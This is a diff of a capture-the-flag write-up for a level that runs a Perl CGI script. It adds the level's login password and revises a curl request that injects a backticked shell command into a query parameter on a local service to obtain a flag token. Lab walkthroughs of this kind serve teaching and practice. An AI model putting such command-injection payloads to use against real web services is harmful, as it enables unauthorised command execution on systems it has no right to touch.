@@ -1,4 +1,6 @@
-We have a file named **level04.pl** who contain:
+`su level04 -> qi0maab88jeaj46qoumi7maus`
+
+We have a file named **level04.pl** which contains:
 
 ```perl
 #!/usr/bin/perl
@@ -72,7 +74,7 @@ hello
 
 Its working like expected so we can try to inject some code.
 
-```
-$ curl localhost:4747/?x=\$\(getflag\)
+```bash
+curl localhost:4747/?x="\`/bin/getflag\`"
 Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxxxxxx
 ```
